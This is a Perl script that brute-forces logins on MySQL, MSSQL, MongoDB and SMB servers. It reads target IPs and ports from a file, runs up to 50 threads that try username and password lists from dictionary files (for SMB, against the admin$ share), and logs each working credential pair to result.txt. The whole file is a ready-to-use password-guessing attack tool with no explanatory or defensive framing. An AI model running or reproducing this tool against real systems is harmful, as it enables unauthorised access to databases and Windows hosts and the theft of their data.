use strict;
use DBI;
use threads;
use MongoDB;
use Try::Tiny;
use SMB::Client;

open OUT,">>result.txt";
my $thread_e=0;
open IN,"target.txt";
while (<IN>){
	my @thread_e=threads->list(threads::all);
	$thread_e=@thread_e;
	if ($thread_e<50){
		my $line=$_;
		chomp ($line);
		my @line=split /,/,$line;
		if ($line[0] eq "mysql"){
			my $t1 = threads->create(\&mysql,"$line[1]","$line[2]");
		}
		elsif ($line[0] eq "mssql"){
			my $t1 = threads->create(\&mssql,"$line[1]","$line[2]");
		}
		elsif ($line[0] eq "mongo"){
			my $t1 = threads->create(\&mongo,"$line[1]","$line[2]");
		}
		elsif ($line[0] eq "smb"){
			my $t1 = threads->create(\&smb,"$line[1]","$line[2]");
		}
	}
	else {
		foreach my $thread ( threads->list(threads::joinable) ){
			$thread->join();
		}
		redo;
	}
}
close IN;
foreach my $thread ( threads->list(threads::all) )
{
	$thread->join();
}
close OUT;


sub mysql{
	my @user;
	my @pass;
	open UN,"dic\\mysql_user.txt";
	while (<UN>){
		my $user=$_;
		chomp ($user);
		push @user,$user;
	}
	close UN;
	open PW,"dic\\mysql_pass.txt";
	while (<PW>){
		my $pass=$_;
		chomp ($pass);
		push @pass,$pass;
	}
	close PW;
	my $done=0;
	my $ip=$_[0];
	my $port=$_[1];
	my $dsn = "DBI:mysql:database=mysql;host=$ip;port=$port;mysql_connect_timeout=3";
	foreach my $user(@user){
		foreach my $pass(@pass){
			my $dbh = DBI->connect($dsn, $user, $pass);
			if ($dbh){
				my $out="mysql,$ip:$port,$user:$pass";
				print OUT $out."\n";
				$done=1;
				last;
			}
			sleep 1;
		}
		if ($done==1){
			last;
		}
	}
}

sub mssql{
	my @user;
	my @pass;
	open UN,"dic\\mssql_user.txt";
	while (<UN>){
		my $user=$_;
		chomp ($user);
		push @user,$user;
	}
	close UN;
	open PW,"dic\\mssql_pass.txt";
	while (<PW>){
		my $pass=$_;
		chomp ($pass);
		push @pass,$pass;
	}
	close PW;
	my $done=0;
	my $ip=$_[0];
	my $port=$_[1];
	foreach my $user(@user){
		foreach my $pass(@pass){
			my $dsn = "driver={SQL Server};Server=$ip;Port=$port;Database=master;UID=$user;PWD=$pass";
			my $dbh=DBI->connect("DBI:ODBC:$dsn");
			if ($dbh){
				my $out="mssql,$ip:$port,$user:$pass";
				print OUT $out."\n";
				$done=1;
				last;
			}
			sleep 1;
		}
		if ($done==1){
			last;
		}
	}
}

sub mongo{
	my @user;
	my @pass;
	open UN,"dic\\mongo_user.txt";
	while (<UN>){
		my $user=$_;
		chomp ($user);
		push @user,$user;
	}
	close UN;
	open PW,"dic\\mongo_pass.txt";
	while (<PW>){
		my $pass=$_;
		chomp ($pass);
		push @pass,$pass;
	}
	close PW;
	my $done=0;
	my $ip=$_[0];
	my $port=$_[1];
	foreach my $user(@user){
		foreach my $pass(@pass){
			my $client;
			my $database;
			try {
				$client = MongoDB::MongoClient->new(host=>"mongodb://$ip:$port",username=>$user,password=>$pass);
				$client->connect;
				$database   = $client->get_database("admin");
			}
			catch {
				$database="";
			};
			if ($database){
				my $out="mongo,$ip:$port,$user:$pass";
				print OUT $out."\n";
				$done=1;
				last;
			}
			sleep 1;
		}
		if ($done==1){
			last;
		}
	}
}

sub smb{
	my @user;
	my @pass;
	open UN,"dic\\smb_user.txt";
	while (<UN>){
		my $user=$_;
		chomp ($user);
		push @user,$user;
	}
	close UN;
	open PW,"dic\\smb_pass.txt";
	while (<PW>){
		my $pass=$_;
		chomp ($pass);
		push @pass,$pass;
	}
	close PW;
	my $done=0;
	my $ip=$_[0];
	my $port=$_[1];
	foreach my $user(@user){
		foreach my $pass(@pass){
			my $client = SMB::Client->new("//$ip/admin\$",username => $user,password => $pass);
			my $tree = $client->connect_tree;
			if ($tree){
				my $out="smb,$ip:$port,$user:$pass";
				print OUT $out."\n";
				$done=1;
				last;
			}
			sleep 1;
		}
		if ($done==1){
			last;
		}
	}
}